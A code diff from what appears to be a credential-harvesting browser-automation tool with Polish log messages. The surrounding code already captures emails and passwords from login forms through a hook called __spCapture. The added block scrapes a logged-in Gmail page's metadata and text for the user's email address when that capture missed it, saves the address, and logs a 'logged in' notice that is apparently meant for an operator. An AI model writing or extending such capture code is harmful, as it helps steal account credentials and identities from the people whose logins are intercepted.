@@ -296,7 +296,28 @@ async function launch(accountId, adminIp) {
       // Re-fetch the account — email/password may have been captured (and
       // saved) by __spCapture after launch() first read it, so the closure's
       // own `account` var can be stale by the time login is detected.
-      const current = await getAccount(accountId).catch(() => null) || account;
+      let current = await getAccount(accountId).catch(() => null) || account;
+      // If the email wasn't captured from the login form (common on Gmail
+      // when the user picks an account from the chooser instead of typing
+      // it), read it from the logged-in page itself.
+      if (!current.email) {
+        const detected = await page.evaluate(() => {
+          const metaEmails = Array.from(document.querySelectorAll(
+            'meta[content*="@"], [data-email], [data-identifier]'
+          )).map((el) => el.getAttribute('content') || el.getAttribute('data-email') || el.getAttribute('data-identifier') || '');
+          const ariaEmails = Array.from(document.querySelectorAll('a[aria-label*="@"], [aria-label*="@"]'))
+            .map((el) => el.getAttribute('aria-label') || '');
+          const bodyText = (document.body?.innerText || '').slice(0, 200000);
+          const all = [...metaEmails, ...ariaEmails, bodyText].join('\n');
+          const m = all.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+          return m ? m[0] : null;
+        }).catch(() => null);
+        if (detected) {
+          await saveAccount({ ...current, email: detected });
+          current = { ...current, email: detected };
+          pushLog(accountId, 'capture', `Wykryto email ze strony: ${detected}`);
+        }
+      }
       const caption = [
         `✅ Zalogowano: ${current.label}`,
         `Platforma: ${current.label}`,
